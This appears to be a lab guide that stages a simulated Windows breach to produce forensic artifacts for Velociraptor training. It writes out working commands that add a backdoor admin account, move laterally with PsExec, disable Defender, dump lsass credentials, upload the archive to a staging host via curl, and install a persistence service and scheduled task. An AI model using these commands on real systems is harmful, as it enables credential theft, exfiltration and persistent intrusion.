## Create Windows VMs for both victims

```
xfreerdp /u:administrator /v:ec2-3-137-185-161.us-east-2.compute.amazonaws.com /p:'password' -decorations /dynamic-resolution -compression -themes /f  /audio-mode:1  /t:MainVictim
```

# Preparing the attacker VM

1. Create a Linux machine will be used for staging and watering hole.

Assume IP is 172.31.7.131

SSH to it for the following parts


## Preparing some documents

```
#!/bin/bash

version=0.1
echo Setting up lab $version documents!

#sudo apt-get install zip -y
#cd ~
mkdir ProjectX

# download files for staging
wget https://github.com/Velocidex/velociraptor-docs/archive/refs/heads/master.zip -O ProjectX/project-docs.zip
wget https://github.com/Velocidex/velociraptor/archive/refs/heads/master.zip -O ProjectX/sourcecode.zip
wget https://file-examples.com/storage/fe235481fb64f1ca49a92b5/2017/02/file-sample_100kB.doc -O ProjectX/financials.doc
wget https://file-examples.com/storage/fe235481fb64f1ca49a92b5/2017/02/file-sample_1MB.doc -O ProjectX/employee_stats.doc
wget https://file-examples.com/storage/fe235481fb64f1ca49a92b5/2017/02/file-sample_100kB.docx -O ProjectX/competative_review.docx
wget https://file-examples.com/storage/fe235481fb64f1ca49a92b5/2017/02/file-sample_500kB.docx -O ProjectX/plans_for_world_domination.docx
wget https://file-examples.com/storage/fe235481fb64f1ca49a92b5/2017/02/file-sample_1MB.docx -O ProjectX/grocery_list.docx
wget https://images.examples.com/wp-content/uploads/2018/07/non-disclosure-template-example.docx.zip -O ProjectX/non_disclosure.zip
echo "All my passwords are VelociraptorRules!" > ProjectX/passwords.txt

zip -r projectx.zip ProjectX/
```

## Preparing launch server

```
#!/bin/bash

echo Setting up lab

mkdir -p stage

# download files for staging
wget -c https://live.sysinternals.com/sdelete64.exe -O stage/sd.exe
wget -c https://live.sysinternals.com/procdump64.exe -O stage/pd.exe
wget -c https://live.sysinternals.com/PsExec64.exe -O stage/PsExec64.exe
wget -c https://www.7-zip.org/a/7z2301-x64.exe -O stage/7z.exe

echo "" > stage/rdp.cmd
echo reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f >> stage/rdp.cmd
echo netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes >> stage/rdp.cmd
echo net user winsupport P@ssword /add >> stage/rdp.cmd
echo net localgroup Administrators winsupport /add >> stage/rdp.cmd

echo "" > stage/dump_cred.ps1
echo " Set-MpPreference -DisableBehaviorMonitoring  \$TRUE -DisableIOAVProtection  \$TRUE -DisableScriptScanning  \$TRUE -DisableRealtimeMonitoring  \$TRUE -DisableArchiveScanning  \$TRUE -DisableCatchupFullScan   \$TRUE -DisableCatchupQuickScan   \$TRUE -DisableRemovableDriveScanning  \$TRUE -DisableRestorePoint  \$TRUE -DisableScanningMappedNetworkDrivesForFullScan  \$TRUE -DisableBlockAtFirstSeen  \$TRUE -DisableGradualRelease  \$TRUE -DisableRdpParsing \$True " >> stage/dump_cred.ps1
#echo "Set-MpPreference -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableRealtimeMonitoring $true -DisableArchiveScanning $true -DisableCatchupFullScan $true -DisableCatchupQuickScan $true -DisableRemovableDriveScanning $true -DisableRestorePoint $true -DisableScanningMappedNetworkDrivesForFullScan $true -DisableBlockAtFirstSeen $true -DisableGradualRelease $true -DisableTamperProtection $True -DisableRdpParsing $True" >> stage/dump_cred.ps1
echo "cd ~\\Downloads" >> stage/dump_cred.ps1
echo ".\\pd.exe -accepteula -r -ma lsass.exe c:\\Users\\Public\\1" >> stage/dump_cred.ps1
echo "" >> stage/dump_cred.ps1
echo "Compress-Archive  -Path C:\\Users\\Administrator\\Desktop\\ProjectX,C:\\Users\\Public\\1.dmp -DestinationPath C:\\Users\\Public\\data.zip -Force" >> stage/dump_cred.ps1
echo "Remove-Item c:\\Users\\Public\\1.dmp" >> stage/dump_cred.ps1
echo "dir C:\\Users\\Public" >> stage/dump_cred.ps1


mv projectx.zip  stage/projectx.zip

cd stage
(python3 -m http.server 1314) &
```

# Preparing the Velociraptor server.

1. Install server as per instructions.

 Assume hostname is ctf.velocidex-training.com

2. Create new org
3. build an MSI for it.
4. Download MSI and Upload to data store by selecting the Upgrade
   artifact and adding the MSI manually. This will produce a public
   serve URL which you can share.

on all Windows machines install Velociraptor (XXXX is from the public share URL)
```
curl.exe https://ctf.velocidex-training.com/public/XXXX -o velo.msi
msiexec /i velo.msi
```

5. Add the following client monitoring
 - ETW.FileCreation
 - TrackProcesses with sysmon.

# Prepare windows machine - MainVictim

This is the Windows Machine which will be breached.

Assume IP is 172.31.14.220


```
# Enable Prefetch
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /d 3 /f

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Prefetcher" /v MaxPrefetchFiles /t REG_DWORD /d 8192 /f

powershell /c "Enable-MMAgent -OperationAPI"

# in powershell use these to create some interesting documents on the desktop.
curl http://172.31.7.131:1314/projectx.zip  -OutFile c:\Users\Administrator\Desktop\demo.zip
Expand-Archive c:\Users\Administrator\Desktop\demo.zip -DestinationPath c:\Users\Administrator\Desktop\
Remove-Item c:\Users\Administrator\Desktop\demo.zip -Force

# Enable psexec access for this demo
Set-NetFirewallRule -DisplayGroup "File And Printer Sharing" -Enabled True -Profile Public

```

# Prepare windows machine - AttackVictim

This VM is also a windows machine which will serve as patient 0. This
is the intial attack vector used by the attacker to laterally move to
the MainVictim.

For this demonstration we assume the attacker has local admin on
AttackVictim usually via Phishing or other vector. We also assume the
attacker has creds on the MainVictim machine so they can laterally
move to it (e.g. via dumping creds from memory or bruteforcing).

```
# Enable Prefetch
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /d 3 /f

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Prefetcher" /v MaxPrefetchFiles /t REG_DWORD /d 8192 /f

powershell /c "Enable-MMAgent -OperationAPI"

curl.exe https://live.sysinternals.com/PsExec64.exe -o c:\Users\Administrator\Desktop\psexec64.exe
curl.exe http://172.31.7.131:1314/rdp.cmd -o c:\Users\Administrator\Desktop\rdp.cmd

# Below IP is for Victim - Creates new user and enable RDP access.
# You will be asked for password for the administrator account on
# MainVictim, which we assume the attacker has cracked.
c:\Users\Administrator\Desktop\psexec64.exe \\172.31.14.220 -u administrator -r notsuspicious -s -c c:\Users\Administrator\Desktop\rdp.cmd  -accepteula
```

## Log in with the new user creds and RDP

The new account is created with the creds in rdp.cmd
winsupport/P@ssword . It is probably a good idea to change the
password but do not use special chars like $ or quotes because they
make it harder to quote in powershell.

```
#!/bin/bash

xfreerdp /u:winsupport /v:ec2-3-137-185-161.us-east-2.compute.amazonaws.com /p:'P@ssword' -decorations /dynamic-resolution -compression -themes /f  /audio-mode:1 /t:WinSupport
```

Start a web broser and navigate to google: Search for "How to hack!"

Navigate to the staging server: http://172.31.7.131:1314/

Download pd.exe and dump_creds.ps1

Open explorer and navigate to c:\users\administrator\desktop

Open some documents (for recent files etc)

## Capturing creds

* Open an ISE as administrator
* Start a new file . Paste the following into it

```
Set-MpPreference -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableRealtimeMonitoring $true -DisableArchiveScanning $true -DisableCatchupFullScan $true -DisableCatchupQuickScan $true -DisableRemovableDriveScanning $true -DisableRestorePoint $true -DisableScanningMappedNetworkDrivesForFullScan $true -DisableBlockAtFirstSeen $true -DisableGradualRelease $true -DisableRdpParsing $True

cd ~\Downloads

.\pd.exe -accepteula -r -ma lsass.exe c:\Users\Public\1

Compress-Archive  -Path C:\Users\Administrator\Desktop\ProjectX,C:\Users\Public\1.dmp -DestinationPath C:\Users\Public\data.zip -Force

Remove-Item c:\Users\Public\1.dmp

dir C:\Users\Public

curl.exe -F 'file=@C:\Users\Public\data.zip' http://172.31.7.131:1314/upload
```

NOTE: leave ISE open or hard close so the autosave stays availible as a forensic artifact.


## Install persistence

```
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile AtomicService.exe
PS C:\Users\winsupport\Downloads> sc.exe create NothingToSeeService binPath= .\AtomicService.exe start=auto  type=own


$Action = New-ScheduledTaskAction -Execute "calc.exe"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask AtomicTask -InputObject $object
```
